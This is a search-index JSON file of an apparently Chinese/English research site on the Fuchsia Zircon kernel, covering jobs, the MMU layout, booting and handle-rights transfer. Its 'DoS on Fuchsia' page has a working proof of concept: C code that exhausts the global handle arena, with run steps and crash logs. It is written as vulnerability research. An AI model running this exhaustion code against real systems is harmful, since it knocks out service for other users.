{"config":{"indexing":"full","lang":["en"],"min_search_length":3,"prebuild_index":false,"separator":"[\\s\\-]+"},"docs":[{"location":"","text":"Welcome to SIGFuchsia Trying to make some interesting research on Fuchsia","title":"Home"},{"location":"#welcome-to-sigfuchsia","text":"Trying to make some interesting research on Fuchsia","title":"Welcome to SIGFuchsia"},{"location":"about/","text":"About TODO: about page","title":"About"},{"location":"about/#about","text":"TODO: about page","title":"About"},{"location":"basic/job-process/","text":"Job & Process \u672c\u6587\u8ba8\u8bba\u7684\u6838\u5fc3\u95ee\u9898\uff1a Job \u548c Process \u7684\u4e0d\u540c Job \u5b58\u5728\u7684\u610f\u4e49 Job \u529f\u80fd\u5728\u4ee3\u7801\u5c42\u9762\u7684\u5bf9\u5e94 \u76f8\u5173\u94fe\u63a5 Job Process Synposis A job is a group of processes and possibly other (child) jobs, every process belongs to a single job. Used to track privileges to perform kernel operations, and track and limit basic resource consumption. Privileges to perform syscalls Memory & CPU usage All jobs form a tree. Every job except the root job belongs to a single (parent) job. Job as an Object Source Code fuchsia/zircon/kernel/object/include/object/job_dispatcher.h fuchsia/zircon/kernel/object/job_dispatcher.cc Member Objects Job as an object contains the following: a reference to a parent job a set of child jobs (each of which has this job as its parent) a set of member processes a set of policies [ not implemented] All the above elements are highlight among the following code block: 216 217 218 219 220 221 222 223 224 225 226 227 228 229 230 231 232 233 234 235 236 237 238 239 240 241 242 243 244 245 246 247 248 const fbl :: RefPtr < JobDispatcher > parent_ ; const uint32_t max_height_ ; // The user-friendly job name. For debug purposes only. That // is, there is no mechanism to mint a handle to a job via this name. fbl :: Name < ZX_MAX_NAME_LEN > name_ ; // The common |get_lock()| protects all members below. State state_ TA_GUARDED ( get_lock ()); int64_t return_code_ TA_GUARDED ( get_lock ()); // TODO(cpu): The OOM kill system is incomplete, see fxbug.dev/32577 for details. bool kill_on_oom_ TA_GUARDED ( get_lock ()); template < typename Ptr , typename Tag > using SizedDoublyLinkedList = fbl :: DoublyLinkedList < Ptr , Tag , fbl :: SizeOrder :: Constant , fbl :: DefaultDoublyLinkedListTraits < Ptr , Tag >> ; using RawJobList = SizedDoublyLinkedList < JobDispatcher * , RawListTag > ; using JobList = fbl :: TaggedSinglyLinkedList < fbl :: RefPtr < JobDispatcher > , ListTag > ; using RawProcessList = SizedDoublyLinkedList < ProcessDispatcher * , ProcessDispatcher :: RawJobListTag > ; using ProcessList = fbl :: TaggedSinglyLinkedList < fbl :: RefPtr < ProcessDispatcher > , ProcessDispatcher :: JobListTag > ; // Access to the pointers in these lists, especially any promotions to // RefPtr, must be handled very carefully, because the children can die // even when |lock_| is held. See ForEachChildInLocked() for more details // and for a safe way to enumerate them. RawJobList jobs_ TA_GUARDED ( get_lock ()); RawProcessList procs_ TA_GUARDED ( get_lock ()); JobPolicy policy_ TA_GUARDED ( get_lock ()); 236 \u884c\u548c 238 \u7684 using \u5173\u952e\u5b57\u662f C++11 \u7684 type alias \u5173\u952e\u5b57\uff0c\u7b49\u540c\u4e8e typedef \u3002 \u4e3a\u4ec0\u4e48\u9700\u8981 Job \u7b54\uff1a\u662f\u4e3a\u4e86\u652f\u6301 Fuchsia \u4e2d\u7684 Sandboxing Where to Track Previledges to Perform Syscalls TODO Where to Limit Memory & CPU TODO Security Concerns OOM kill system is incomplete \u4f46\u662f\u8fd8\u6ca1\u641e\u6e05\u695a\u5230\u5e95 incomplete \u5728\u54ea\u91cc","title":"Jobs & Process"},{"location":"basic/job-process/#job-process","text":"\u672c\u6587\u8ba8\u8bba\u7684\u6838\u5fc3\u95ee\u9898\uff1a Job \u548c Process \u7684\u4e0d\u540c Job \u5b58\u5728\u7684\u610f\u4e49 Job \u529f\u80fd\u5728\u4ee3\u7801\u5c42\u9762\u7684\u5bf9\u5e94","title":"Job &amp; Process"},{"location":"basic/job-process/#_1","text":"Job Process","title":"\u76f8\u5173\u94fe\u63a5"},{"location":"basic/job-process/#synposis","text":"A job is a group of processes and possibly other (child) jobs, every process belongs to a single job. Used to track privileges to perform kernel operations, and track and limit basic resource consumption. Privileges to perform syscalls Memory & CPU usage All jobs form a tree. Every job except the root job belongs to a single (parent) job.","title":"Synposis"},{"location":"basic/job-process/#job-as-an-object","text":"","title":"Job as an Object"},{"location":"basic/job-process/#source-code","text":"fuchsia/zircon/kernel/object/include/object/job_dispatcher.h fuchsia/zircon/kernel/object/job_dispatcher.cc","title":"Source Code"},{"location":"basic/job-process/#member-objects","text":"Job as an object contains the following: a reference to a parent job a set of child jobs (each of which has this job as its parent) a set of member processes a set of policies [ not implemented] All the above elements are highlight among the following code block: 216 217 218 219 220 221 222 223 224 225 226 227 228 229 230 231 232 233 234 235 236 237 238 239 240 241 242 243 244 245 246 247 248 const fbl :: RefPtr < JobDispatcher > parent_ ; const uint32_t max_height_ ; // The user-friendly job name. For debug purposes only. That // is, there is no mechanism to mint a handle to a job via this name. fbl :: Name < ZX_MAX_NAME_LEN > name_ ; // The common |get_lock()| protects all members below. State state_ TA_GUARDED ( get_lock ()); int64_t return_code_ TA_GUARDED ( get_lock ()); // TODO(cpu): The OOM kill system is incomplete, see fxbug.dev/32577 for details. bool kill_on_oom_ TA_GUARDED ( get_lock ()); template < typename Ptr , typename Tag > using SizedDoublyLinkedList = fbl :: DoublyLinkedList < Ptr , Tag , fbl :: SizeOrder :: Constant , fbl :: DefaultDoublyLinkedListTraits < Ptr , Tag >> ; using RawJobList = SizedDoublyLinkedList < JobDispatcher * , RawListTag > ; using JobList = fbl :: TaggedSinglyLinkedList < fbl :: RefPtr < JobDispatcher > , ListTag > ; using RawProcessList = SizedDoublyLinkedList < ProcessDispatcher * , ProcessDispatcher :: RawJobListTag > ; using ProcessList = fbl :: TaggedSinglyLinkedList < fbl :: RefPtr < ProcessDispatcher > , ProcessDispatcher :: JobListTag > ; // Access to the pointers in these lists, especially any promotions to // RefPtr, must be handled very carefully, because the children can die // even when |lock_| is held. See ForEachChildInLocked() for more details // and for a safe way to enumerate them. RawJobList jobs_ TA_GUARDED ( get_lock ()); RawProcessList procs_ TA_GUARDED ( get_lock ()); JobPolicy policy_ TA_GUARDED ( get_lock ()); 236 \u884c\u548c 238 \u7684 using \u5173\u952e\u5b57\u662f C++11 \u7684 type alias \u5173\u952e\u5b57\uff0c\u7b49\u540c\u4e8e typedef \u3002","title":"Member Objects"},{"location":"basic/job-process/#job","text":"\u7b54\uff1a\u662f\u4e3a\u4e86\u652f\u6301 Fuchsia \u4e2d\u7684 Sandboxing","title":"\u4e3a\u4ec0\u4e48\u9700\u8981 Job"},{"location":"basic/job-process/#where-to-track-previledges-to-perform-syscalls","text":"TODO","title":"Where to Track Previledges to Perform Syscalls"},{"location":"basic/job-process/#where-to-limit-memory-cpu","text":"TODO","title":"Where to Limit Memory &amp; CPU"},{"location":"basic/job-process/#security-concerns","text":"OOM kill system is incomplete \u4f46\u662f\u8fd8\u6ca1\u641e\u6e05\u695a\u5230\u5e95 incomplete \u5728\u54ea\u91cc","title":"Security Concerns"},{"location":"basic/mmu/","text":"MMU (\u4ee5 ARM64 \u4e3a\u4f8b) ISA: ARMv8.0-A Basic Configuration \u6709\u6548\u5730\u5740\u4f4d\u6570: 39 bits \u7c92\u5ea6: 4K page size Memory Layout +----------------------+ <- 0x0000_0000_0100_0000 (USER_ASPACE_BASE) | | | user address space | } 0x0000_ffff_fe00_0000 (USER_ASPACE_SIZE) | | +----------------------+ | ... | +----------------------+ <- 0xffff_0000_0000_0000 (KERNEL_ASPACE_BASE) | | | kernel address space | } 0x0001_0000_0000_0000 (KERNEL_ASPACE_SIZE) | | +----------------------+ Concluded from kernel_aspace.h .","title":"MMU"},{"location":"basic/mmu/#mmu-arm64","text":"ISA: ARMv8.0-A","title":"MMU (\u4ee5 ARM64 \u4e3a\u4f8b)"},{"location":"basic/mmu/#basic-configuration","text":"\u6709\u6548\u5730\u5740\u4f4d\u6570: 39 bits \u7c92\u5ea6: 4K page size","title":"Basic Configuration"},{"location":"basic/mmu/#memory-layout","text":"+----------------------+ <- 0x0000_0000_0100_0000 (USER_ASPACE_BASE) | | | user address space | } 0x0000_ffff_fe00_0000 (USER_ASPACE_SIZE) | | +----------------------+ | ... | +----------------------+ <- 0xffff_0000_0000_0000 (KERNEL_ASPACE_BASE) | | | kernel address space | } 0x0001_0000_0000_0000 (KERNEL_ASPACE_SIZE) | | +----------------------+ Concluded from kernel_aspace.h .","title":"Memory Layout"},{"location":"play/boot/","text":"Boot Fuchsia on Intel NUC The following record is based on the official documents. Actually we have a failed boot corresponding with a bug report . Yet an older version works all fine without problem.","title":"Boot Fuchsia on NUC"},{"location":"play/boot/#boot-fuchsia-on-intel-nuc","text":"The following record is based on the official documents. Actually we have a failed boot corresponding with a bug report . Yet an older version works all fine without problem.","title":"Boot Fuchsia on Intel NUC"},{"location":"play/dos/","text":"Dos on Fuchsia Reproducing may take you only 1 min. Set-up Replace \"/examples/fortune/fortune.c\" with the following code. // Get a handle by calling zx_vmo_create, then call zx_handle_duplicate to duplicate the handle. // Here I try to duplicate 300*1024 handles, while the max number of handles is initialized as 256*1024 in _arena.Init(). #include <stdio.h> #include <zircon/syscalls.h> #define max_num 300*1024 zx_handle_t res_handle [ max_num ]; int main () { zx_handle_t handle1 ; zx_status_t sys_ret ; sys_ret = zx_vmo_create ( 10 , 0 , & handle1 ); if ( sys_ret == ZX_ERR_INVALID_ARGS ) { printf ( \"wrong with zx_vmo_create\" ); } else if ( sys_ret == ZX_ERR_NO_MEMORY ) { printf ( \"wrong no mem\" ); } else { printf ( \"syscall success\" ); } int i = 0 ; while ( i < max_num ) { sys_ret = zx_handle_duplicate ( handle1 , ZX_RIGHT_SAME_RIGHTS , & res_handle [ i ]); if ( sys_ret == ZX_ERR_NO_MEMORY ) { // printf(\"Ddddddddos\"); } i ++ ; } while ( 1 ) {} return 0 ; } Call printf(...) when handle could not be created. /zircon/kernel/lib/fbl/include/fbl/gparena.h void * Alloc (){ ... do { ... if (...){ if (...){ printf ( \"DDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDos!!!\" ); // here!!! return nullptr ; } } } while ( ! top_ . compare_exchange_strong ( top , next_top , ktl :: memory_order_relaxed , ktl :: memory_order_relaxed )); count_ . fetch_add ( 1 , ktl :: memory_order_relaxed ); return reinterpret_cast < void *> ( top ); } Run Open 3 terminals. Terminal 1 $ fx set workstation.qemu-x64 --ccache --with //example/fortune $ fx build $ fx vdl start -N -u FUCHSIA_ROOT/scripts/start-unsecure-internet.sh Terminal 2 $ fx serve-updates Terminal 3 $ fx log Terminal 1 $ fortune Result Warnning in Terminal 3, then the FEMU crash. Terminal 3 [00016.023134][57943][57945][klog] WARNING: WARNING: High handle count: 229377 / 229376 handles [00016.029523][57943][57945][klog] WARNING: DDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDos!!!WARNING: Could not allocate duplicate handle (262144 outstanding) [00016.029527][57943][57945][klog] WARNING: DDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDos!!!WARNING: Could not allocate duplicate handle (262144 outstanding) [00016.029528][57943][57945][klog] WARNING: DDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDos!!!WARNING: Could not allocate duplicate handle (262144 outstanding) [00016.029528][57943][57945][klog] WARNING: DDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDos!!!WARNING: Could not allocate duplicate handle (262144 outstanding) [00016.029529][57943][57945][klog] WARNING: DDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDos!!!WARNING: Could not allocate duplicate handle (262144 outstanding) [00016.029529][57943][57945][klog] WARNING: DDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDos!!!WARNING: Could not allocate duplicate handle (262144 outstanding) [00016.029530][57943][57945][klog] WARNING: DDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDos!!!WARNING: Could not allocate duplicate handle (262144 outstanding) [00016.029530][57943][57945][klog] WARNING: DDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDos!!!WARNING: Could not allocate duplicate handle (262144 outstanding) [00016.029532][57943][57945][klog] WARNING: DDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDos!!!WARNING: Could not allocate duplicate handle (262144 outstanding) [00016.029535][57943][57945][klog] WARNING: DDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDos!!!WARNING: Could not allocate duplicate handle (262144 outstanding) [00016.029536][57943][57945][klog] WARNING: DDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDos!!!WARNING: Could not allocate duplicate handle (262144 outstanding) [00016.029538][57943][57945][klog] WARNING: DDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDos!!!WARNING: Could not allocate duplicate handle (262144 outstanding) [00016.029575][57943][57945][klog] WARNING: DDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDos!!!WARNING: Could not allocate duplicate handle (262144 outstanding) You can see that now the number of exsiting handles is 256*1024 = 262144, or the max number of handles. Terminal 1 $ ssh: Could not resolve hostname : Temporary failure in name resolution kex_exchange_identification: Connection closed by remote host kex_exchange_identification: Connection closed by remote host kex_exchange_identification: Connection closed by remote host kex_exchange_identification: Connection closed by remote host kex_exchange_identification: Connection closed by remote host kex_exchange_identification: Connection closed by remote host kex_exchange_identification: Connection closed by remote host kex_exchange_identification: Connection closed by remote host kex_exchange_identification: Connection closed by remote host kex_exchange_identification: Connection closed by remote host Details Zircon Handles allows user space programs to reference kernel objects. Sharable Resource: Zircon maintains a global struct call HandleTableArena gHandleTableArena for allocating all Handles. Limit: The arena has a limit for all live handles, specified by kMaxHandleCount , whose value is 256 * 1024. gHandleTableArena contains a member of fbl::GPArena arena_ , whose Init allocates kMaxHandleCount * handle_size memory. If the number of live handles goes beyond the limit, Alloc will return nullptr . The attacker can consume handles to exhaust all handles in gHandleTableArena. 1) Handles are frequently-used in Zircon. Any events, processes, or threads are consuming new handles. 2) Currently we did not find any per-user limits on handles. 3) If handles are exhausted, the users cannot send events or creates any processes or threads. Count: GPArena maintains a count_, which increments in Alloc .","title":"DoS on Fuchsia"},{"location":"play/dos/#dos-on-fuchsia","text":"Reproducing may take you only 1 min.","title":"Dos on Fuchsia"},{"location":"play/dos/#set-up","text":"Replace \"/examples/fortune/fortune.c\" with the following code. // Get a handle by calling zx_vmo_create, then call zx_handle_duplicate to duplicate the handle. // Here I try to duplicate 300*1024 handles, while the max number of handles is initialized as 256*1024 in _arena.Init(). #include <stdio.h> #include <zircon/syscalls.h> #define max_num 300*1024 zx_handle_t res_handle [ max_num ]; int main () { zx_handle_t handle1 ; zx_status_t sys_ret ; sys_ret = zx_vmo_create ( 10 , 0 , & handle1 ); if ( sys_ret == ZX_ERR_INVALID_ARGS ) { printf ( \"wrong with zx_vmo_create\" ); } else if ( sys_ret == ZX_ERR_NO_MEMORY ) { printf ( \"wrong no mem\" ); } else { printf ( \"syscall success\" ); } int i = 0 ; while ( i < max_num ) { sys_ret = zx_handle_duplicate ( handle1 , ZX_RIGHT_SAME_RIGHTS , & res_handle [ i ]); if ( sys_ret == ZX_ERR_NO_MEMORY ) { // printf(\"Ddddddddos\"); } i ++ ; } while ( 1 ) {} return 0 ; } Call printf(...) when handle could not be created. /zircon/kernel/lib/fbl/include/fbl/gparena.h void * Alloc (){ ... do { ... if (...){ if (...){ printf ( \"DDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDos!!!\" ); // here!!! return nullptr ; } } } while ( ! top_ . compare_exchange_strong ( top , next_top , ktl :: memory_order_relaxed , ktl :: memory_order_relaxed )); count_ . fetch_add ( 1 , ktl :: memory_order_relaxed ); return reinterpret_cast < void *> ( top ); }","title":"Set-up"},{"location":"play/dos/#run","text":"Open 3 terminals. Terminal 1 $ fx set workstation.qemu-x64 --ccache --with //example/fortune $ fx build $ fx vdl start -N -u FUCHSIA_ROOT/scripts/start-unsecure-internet.sh Terminal 2 $ fx serve-updates Terminal 3 $ fx log Terminal 1 $ fortune","title":"Run"},{"location":"play/dos/#result","text":"Warnning in Terminal 3, then the FEMU crash. Terminal 3 [00016.023134][57943][57945][klog] WARNING: WARNING: High handle count: 229377 / 229376 handles [00016.029523][57943][57945][klog] WARNING: DDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDos!!!WARNING: Could not allocate duplicate handle (262144 outstanding) [00016.029527][57943][57945][klog] WARNING: DDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDos!!!WARNING: Could not allocate duplicate handle (262144 outstanding) [00016.029528][57943][57945][klog] WARNING: DDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDos!!!WARNING: Could not allocate duplicate handle (262144 outstanding) [00016.029528][57943][57945][klog] WARNING: DDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDos!!!WARNING: Could not allocate duplicate handle (262144 outstanding) [00016.029529][57943][57945][klog] WARNING: DDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDos!!!WARNING: Could not allocate duplicate handle (262144 outstanding) [00016.029529][57943][57945][klog] WARNING: DDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDos!!!WARNING: Could not allocate duplicate handle (262144 outstanding) [00016.029530][57943][57945][klog] WARNING: DDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDos!!!WARNING: Could not allocate duplicate handle (262144 outstanding) [00016.029530][57943][57945][klog] WARNING: DDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDos!!!WARNING: Could not allocate duplicate handle (262144 outstanding) [00016.029532][57943][57945][klog] WARNING: DDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDos!!!WARNING: Could not allocate duplicate handle (262144 outstanding) [00016.029535][57943][57945][klog] WARNING: DDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDos!!!WARNING: Could not allocate duplicate handle (262144 outstanding) [00016.029536][57943][57945][klog] WARNING: DDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDos!!!WARNING: Could not allocate duplicate handle (262144 outstanding) [00016.029538][57943][57945][klog] WARNING: DDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDos!!!WARNING: Could not allocate duplicate handle (262144 outstanding) [00016.029575][57943][57945][klog] WARNING: DDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDos!!!WARNING: Could not allocate duplicate handle (262144 outstanding) You can see that now the number of exsiting handles is 256*1024 = 262144, or the max number of handles. Terminal 1 $ ssh: Could not resolve hostname : Temporary failure in name resolution kex_exchange_identification: Connection closed by remote host kex_exchange_identification: Connection closed by remote host kex_exchange_identification: Connection closed by remote host kex_exchange_identification: Connection closed by remote host kex_exchange_identification: Connection closed by remote host kex_exchange_identification: Connection closed by remote host kex_exchange_identification: Connection closed by remote host kex_exchange_identification: Connection closed by remote host kex_exchange_identification: Connection closed by remote host kex_exchange_identification: Connection closed by remote host","title":"Result"},{"location":"play/dos/#details","text":"Zircon Handles allows user space programs to reference kernel objects. Sharable Resource: Zircon maintains a global struct call HandleTableArena gHandleTableArena for allocating all Handles. Limit: The arena has a limit for all live handles, specified by kMaxHandleCount , whose value is 256 * 1024. gHandleTableArena contains a member of fbl::GPArena arena_ , whose Init allocates kMaxHandleCount * handle_size memory. If the number of live handles goes beyond the limit, Alloc will return nullptr . The attacker can consume handles to exhaust all handles in gHandleTableArena. 1) Handles are frequently-used in Zircon. Any events, processes, or threads are consuming new handles. 2) Currently we did not find any per-user limits on handles. 3) If handles are exhausted, the users cannot send events or creates any processes or threads. Count: GPArena maintains a count_, which increments in Alloc .","title":"Details"},{"location":"play/handle/","text":"Handle management and rights. When is a handle bound to a process? When allocated, the owner process_id_ is ZX_KOID_INVALID . We can see the source code in //zircon/kernel/lib/syscalls/priv.h . Kazoo will help do this automatically. // This is the type of handle result parameters in system call // implementation functions (sys_*). kazoo recognizes return values of // type zx_handle_t and converts them into user_out_handle* instead of into // user_out_ptr<zx_handle_t>. System call implementation functions use the // make, dup, or transfer method to turn a Dispatcher pointer or another // handle into a handle received by the user. class user_out_handle final { public : zx_status_t make ( fbl :: RefPtr < Dispatcher > dispatcher , zx_rights_t rights ) { h_ = Handle :: Make ( ktl :: move ( dispatcher ), rights ); return h_ ? ZX_OK : ZX_ERR_NO_MEMORY ; } // Note that if this call fails to allocate the Handle, the underlying // Dispatcher's on_zero_handles() will be called. zx_status_t make ( KernelHandle < Dispatcher > handle , zx_rights_t rights ) { h_ = Handle :: Make ( ktl :: move ( handle ), rights ); return h_ ? ZX_OK : ZX_ERR_NO_MEMORY ; } zx_status_t dup ( Handle * source , zx_rights_t rights ) { h_ = Handle :: Dup ( source , rights ); return h_ ? ZX_OK : ZX_ERR_NO_MEMORY ; } zx_status_t transfer ( HandleOwner && source ) { h_ . swap ( source ); return ZX_OK ; } // These methods are called by the kazoo-generated wrapper_* functions // (syscall-kernel-wrappers.inc). See KernelWrapperGenerator::syscall. bool begin_copyout ( ProcessDispatcher * current_process , user_out_ptr < zx_handle_t > out ) const { if ( h_ ) return out . copy_to_user ( current_process -> handle_table (). MapHandleToValue ( h_ )); return false ; } void finish_copyout ( ProcessDispatcher * current_process ) { if ( h_ ) current_process -> handle_table (). AddHandle ( ktl :: move ( h_ )); } private : HandleOwner h_ ; }; How does handle or right transfer? Is there a time when the handle belongs to both processes? For a handle, if we want to duplicate or transfer it (not create a default one), can we add additional rights? First, handles with transfer right can be transfered via zx_channel_write (gives the handle from the calling process to the kernel) and zx_channel_read/zx_channel_call (binds the handle to the calling process). The channel write function is in //zircon/kernel/lib/syscalls/channel.cc . In fact, this kind of input arguments remind me of buffer over-read. We check RemoveUserHandles() and msg_put_handles() to check if the kernel gives the protection. When we read from a channel, the message includes the reference of the original owner and the handle (in zx_handle_t state). zx_channel_write() attempts to write a message of num_bytes bytes and num_handles handles to the channel specified by handle . The pointers handles and bytes may be NULL if their respective sizes are zero. On success, all num_handles of the handles in the handles array are attached to the message and will become available to the reader of that message from the opposite end of the channel. All handles are discarded and no longer available to the caller, on success or failure. The pointer of zx_handle_disposition is UserHandles in the function. In the structure, handle is the user provided integer, operation is ZX_HANDLE_OP_MOVE or ZX_HANDLE_OP_DUPLICATE , type is used to perform validation of the object type that the caller expects handle to be, rights are the desired rights. Handle will be transferred with capability rights which can be ZX_RIGHT_SAME_RIGHTS or a reduced set of rights, or ZX_RIGHT_NONE . template < typename UserHandles > static zx_status_t channel_write ( zx_handle_t handle_value , uint32_t options , user_in_ptr < const void > user_bytes , uint32_t num_bytes , UserHandles user_handles , uint32_t num_handles ) { auto up = ProcessDispatcher :: GetCurrent (); auto cleanup = fit :: defer ([ & ]() { RemoveUserHandles ( user_handles , num_handles , up ); }); fbl :: RefPtr < ChannelDispatcher > channel ; zx_status_t status = up -> handle_table (). GetDispatcherWithRights ( handle_value , ZX_RIGHT_WRITE , & channel ); MessagePacketPtr msg ; if (( options & ZX_CHANNEL_WRITE_USE_IOVEC ) != 0 ) { status = MessagePacket :: Create ( user_bytes . reinterpret < const zx_channel_iovec_t > (), num_bytes , num_handles , & msg ); } else { status = MessagePacket :: Create ( user_bytes . reinterpret < const char > (), num_bytes , num_handles , & msg ); } if ( num_handles > 0u ) { status = msg_put_handles ( up , msg . get (), user_handles , num_handles , static_cast < Dispatcher *> ( channel . get ())); } cleanup . cancel (); status = channel -> Write ( up -> get_koid (), ktl :: move ( msg )); return ZX_OK ; } typedef struct zx_handle_disposition { zx_handle_op_t operation ; zx_handle_t handle ; zx_obj_type_t type ; zx_rights_t rights ; zx_status_t result ; } zx_handle_disposition_t ; // In msg_put_handles() -> get_handle_for_message_locked() -> handle_checks_locked() // , the handle's rights must be reduced or keep same. static zx_status_t handle_checks_locked ( const Handle * handle , const Dispatcher * channel , zx_handle_op_t operation , zx_rights_t desired_rights , zx_obj_type_t type ) { if ( ! handle ) return ZX_ERR_BAD_HANDLE ; if ( ! handle -> HasRights ( ZX_RIGHT_TRANSFER )) return ZX_ERR_ACCESS_DENIED ; if ( handle -> dispatcher (). get () == channel ) return ZX_ERR_NOT_SUPPORTED ; if ( type != ZX_OBJ_TYPE_NONE && handle -> dispatcher () -> get_type () != type ) return ZX_ERR_WRONG_TYPE ; if ( operation != ZX_HANDLE_OP_MOVE && operation != ZX_HANDLE_OP_DUPLICATE ) return ZX_ERR_INVALID_ARGS ; if ( desired_rights != ZX_RIGHT_SAME_RIGHTS ) { if (( handle -> rights () & desired_rights ) != desired_rights ) { return ZX_ERR_INVALID_ARGS ; } } if (( operation == ZX_HANDLE_OP_DUPLICATE ) && ! handle -> HasRights ( ZX_RIGHT_DUPLICATE )) return ZX_ERR_ACCESS_DENIED ; return ZX_OK ; } For the process with the handle pointing to another end of the channel, the channel_read is simpler in rights checking. template < typename HandleInfoT > static zx_status_t channel_read ( zx_handle_t handle_value , uint32_t options , user_out_ptr < void > bytes , user_out_ptr < HandleInfoT > handles , uint32_t num_bytes , uint32_t num_handles , user_out_ptr < uint32_t > actual_bytes , user_out_ptr < uint32_t > actual_handles ) { auto up = ProcessDispatcher :: GetCurrent (); fbl :: RefPtr < ChannelDispatcher > channel ; zx_status_t result = up -> handle_table (). GetDispatcherWithRights ( handle_value , ZX_RIGHT_READ , & channel ); // Currently MAY_DISCARD is the only allowable option. if ( options & ~ ZX_CHANNEL_READ_MAY_DISCARD ) return ZX_ERR_NOT_SUPPORTED ; MessagePacketPtr msg ; result = channel -> Read ( up -> get_koid (), & num_bytes , & num_handles , & msg , options & ZX_CHANNEL_READ_MAY_DISCARD ); // On ZX_ERR_BUFFER_TOO_SMALL, Read() gives us the size of the next message (which remains // unconsumed, unless |options| has ZX_CHANNEL_READ_MAY_DISCARD set). if ( actual_bytes ) { zx_status_t status = actual_bytes . copy_to_user ( num_bytes ); } if ( actual_handles ) { zx_status_t status = actual_handles . copy_to_user ( num_handles ); } if ( num_bytes > 0u ) { if ( msg -> CopyDataTo ( bytes . reinterpret < char > ()) != ZX_OK ) return ZX_ERR_INVALID_ARGS ; } // The documented public API states that that writing to the handles buffer // must happen after writing to the data buffer. if ( num_handles > 0u ) { zx_status_t status = msg_get_handles ( up , msg . get (), handles , num_handles ); } record_recv_msg_sz ( num_bytes ); return result ; } For the second question, the answer tends to be NO . But, currently, I am not so sure. For the third question, the answer is no. At least, we can see the transferable handles must go through rights checking.","title":"Handle management and rights."},{"location":"play/handle/#handle-management-and-rights","text":"When is a handle bound to a process? When allocated, the owner process_id_ is ZX_KOID_INVALID . We can see the source code in //zircon/kernel/lib/syscalls/priv.h . Kazoo will help do this automatically. // This is the type of handle result parameters in system call // implementation functions (sys_*). kazoo recognizes return values of // type zx_handle_t and converts them into user_out_handle* instead of into // user_out_ptr<zx_handle_t>. System call implementation functions use the // make, dup, or transfer method to turn a Dispatcher pointer or another // handle into a handle received by the user. class user_out_handle final { public : zx_status_t make ( fbl :: RefPtr < Dispatcher > dispatcher , zx_rights_t rights ) { h_ = Handle :: Make ( ktl :: move ( dispatcher ), rights ); return h_ ? ZX_OK : ZX_ERR_NO_MEMORY ; } // Note that if this call fails to allocate the Handle, the underlying // Dispatcher's on_zero_handles() will be called. zx_status_t make ( KernelHandle < Dispatcher > handle , zx_rights_t rights ) { h_ = Handle :: Make ( ktl :: move ( handle ), rights ); return h_ ? ZX_OK : ZX_ERR_NO_MEMORY ; } zx_status_t dup ( Handle * source , zx_rights_t rights ) { h_ = Handle :: Dup ( source , rights ); return h_ ? ZX_OK : ZX_ERR_NO_MEMORY ; } zx_status_t transfer ( HandleOwner && source ) { h_ . swap ( source ); return ZX_OK ; } // These methods are called by the kazoo-generated wrapper_* functions // (syscall-kernel-wrappers.inc). See KernelWrapperGenerator::syscall. bool begin_copyout ( ProcessDispatcher * current_process , user_out_ptr < zx_handle_t > out ) const { if ( h_ ) return out . copy_to_user ( current_process -> handle_table (). MapHandleToValue ( h_ )); return false ; } void finish_copyout ( ProcessDispatcher * current_process ) { if ( h_ ) current_process -> handle_table (). AddHandle ( ktl :: move ( h_ )); } private : HandleOwner h_ ; }; How does handle or right transfer? Is there a time when the handle belongs to both processes? For a handle, if we want to duplicate or transfer it (not create a default one), can we add additional rights? First, handles with transfer right can be transfered via zx_channel_write (gives the handle from the calling process to the kernel) and zx_channel_read/zx_channel_call (binds the handle to the calling process). The channel write function is in //zircon/kernel/lib/syscalls/channel.cc . In fact, this kind of input arguments remind me of buffer over-read. We check RemoveUserHandles() and msg_put_handles() to check if the kernel gives the protection. When we read from a channel, the message includes the reference of the original owner and the handle (in zx_handle_t state). zx_channel_write() attempts to write a message of num_bytes bytes and num_handles handles to the channel specified by handle . The pointers handles and bytes may be NULL if their respective sizes are zero. On success, all num_handles of the handles in the handles array are attached to the message and will become available to the reader of that message from the opposite end of the channel. All handles are discarded and no longer available to the caller, on success or failure. The pointer of zx_handle_disposition is UserHandles in the function. In the structure, handle is the user provided integer, operation is ZX_HANDLE_OP_MOVE or ZX_HANDLE_OP_DUPLICATE , type is used to perform validation of the object type that the caller expects handle to be, rights are the desired rights. Handle will be transferred with capability rights which can be ZX_RIGHT_SAME_RIGHTS or a reduced set of rights, or ZX_RIGHT_NONE . template < typename UserHandles > static zx_status_t channel_write ( zx_handle_t handle_value , uint32_t options , user_in_ptr < const void > user_bytes , uint32_t num_bytes , UserHandles user_handles , uint32_t num_handles ) { auto up = ProcessDispatcher :: GetCurrent (); auto cleanup = fit :: defer ([ & ]() { RemoveUserHandles ( user_handles , num_handles , up ); }); fbl :: RefPtr < ChannelDispatcher > channel ; zx_status_t status = up -> handle_table (). 